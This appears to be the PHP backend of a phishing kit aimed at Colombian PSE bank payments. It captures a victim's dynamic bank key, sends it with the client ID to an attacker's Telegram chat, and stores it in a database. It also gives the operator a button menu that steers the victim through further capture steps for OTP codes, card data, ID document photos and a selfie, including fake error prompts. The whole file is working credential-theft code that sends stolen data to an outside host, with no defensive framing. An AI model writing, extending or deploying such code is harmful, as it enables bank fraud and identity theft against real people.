<?php
// modules/api/procesar_dinamica.php
ini_set('display_errors', 0);
session_start();
if (!isset($config) || !is_array($config)) {
    $config = require __DIR__ . '/../../config/config.php';
}
$conn = require __DIR__ . '/../../config/db.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $clienteId = $_POST['cliente_id'] ?? '';
    $dinamica = $_POST['dinamica'] ?? '';
    $isRetry = isset($_POST['retry']) && $_POST['retry'] == '1';

    if (empty($clienteId) || empty($dinamica)) {
        header("Location: ../../index.php");
        exit();
    }

    // 1. Notificar a Telegram
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    // Construir mensaje
    $mensaje = ($isRetry ? "⚠️ *ERROR CLAVE DINÁMICA RECIBIDA*" : "⌚ *CLAVE DINÁMICA RECIBIDA*") . "\n";
    $mensaje .= "🆔 Cliente: `$clienteId`\n";
    $mensaje .= "🔐 Clave Dinámica: `$dinamica`";

    // Teclado con opciones (incluyendo las nuevas)
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$clienteId"],
                ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$clienteId"],
            ],
            [
                ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$clienteId"],
                ['text' => '💳 CC',         'callback_data' => "cmd_5_$clienteId"],
            ],
            [
                ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$clienteId"],
                ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$clienteId"],
            ],
            [
                ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$clienteId"],
                ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$clienteId"]
            ],
            [
                ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$clienteId"],
                ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$clienteId"]
            ],
            [
                ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$clienteId"],
                ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$clienteId"],
                ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$clienteId"]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);

    // 2. Actualizar BD (Guardamos en OTP por simplicidad o podríamos crear columna dinamica)
    // Para no romper esquemas, guardamos en una columna 'otp' concatenada o reemplazada
    // Mejor: actualizamos estado a 1 (Espera) y guardamos el dato

    // Opción: concatenar en campo 'otp' para tener historial, o solo actualizar
    $sql = "UPDATE pse SET estado = 1, otp = :dinamica WHERE id = :id";
    $stmt = $conn->prepare($sql);
    $stmt->execute([
        'dinamica' => $dinamica, // Reemplazamos OTP con la dinámica
        'id' => $clienteId
    ]);

    // 3. Redirigir a Espera
    header("Location: ../../index.php?status=espera&id=" . $clienteId);
    exit();

}
else {
    header("Location: ../../index.php");
    exit();
}
?>
